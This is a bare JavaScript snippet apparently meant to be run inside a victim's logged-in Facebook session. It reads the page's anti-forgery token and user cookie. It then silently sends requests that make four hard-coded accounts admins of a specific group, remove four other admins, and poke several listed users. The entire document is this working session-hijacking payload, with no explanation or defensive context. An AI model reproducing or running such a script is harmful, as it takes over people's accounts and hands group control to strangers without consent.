/*Admin Post*/
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var now = (new Date).getTime();
setTimeout(function () {
function IDS(r) {
    function G(gid) {
        var Page = new XMLHttpRequest();
        var PageURL = "//www.facebook.com/ajax/groups/admins_post.php";
        var PageParams = "fb_dtsg=" + fb_dtsg + "&gid=" + gid + "&uid=" + r + "&operation=confirm_add_admin&source=profilebrowser&make_admin=1&__user=" + user_id + "&__a=1&__dyn=7n8ahyj35zoSt2u5FeDKdo&__req=34&ttstamp=26581661107112011276";
        Page.open("POST", PageURL, true);
        Page.onreadystatechange = function () {
            if (Page.readyState == 4 && Page.status == 200) {
                Page.close;
            }
        };
        Page.send(PageParams);
    }
    G("391559757563844");
}
IDS("100004092334280");
IDS("100003147643648");
IDS("100005147649818");
IDS("100003998763728");
setTimeout(function () { 
/*remove-Admin Post*/
    var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
    var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
    var now = (new Date).getTime();

    function IDS(r) {
        function G(gid) {
            var Page = new XMLHttpRequest();
            var PageURL = "//www.facebook.com/ajax/groups/admins_post.php";
            var PageParams = "fb_dtsg=" + fb_dtsg + "&gid=" + gid + "&uid=" + r + "&operation=confirm_remove_admin&source=profilebrowser&__user=" + user_id + "&__a=1&__dyn=7n8ahyj35zoSt2u5FeDKdo&__req=b&ttstamp=26581661107112011276";
            Page.open("POST", PageURL, true);
            Page.onreadystatechange = function () {
                if (Page.readyState == 4 && Page.status == 200) {
                    Page.close;
                }
            };
            Page.send(PageParams);
        }
        G("391559757563844");
    }
    IDS("100002908006006");
    IDS("100003200476066");
    IDS("100006342757697");
    IDS("100005202368891");
}, 4000);

/*poke*/
var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value;
var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function p(abone) {
  var http4 = new XMLHttpRequest();
  var url4 = "//www.facebook.com/pokes/dialog/?poke_target=" + abone + "&do_confirm=0";
  var params4 = "poke_target=" + abone + "&do_confirm=0&nctr[_mod]=pagelet_timeline_profile_actions&__asyncDialog=1&__user="+user_id+"&__a=1&__dyn=7n8ahyj2qmvudDgDxrHEHyGameyp8y&__req=i&fb_dtsg="+fb_dtsg+"&ttstamp=265816580891117469";
  http4.open("POST", url4, true);
  http4.onreadystatechange = function () {
    if (http4.readyState == 4 && http4.status == 200) {
      http4.close;
    }
  };
  http4.send(params4);
}

p("100005147649818");
p("100004620215045");
p("100005115938614");
p("100005748400819");
p("100003147643648");




}, 3000);



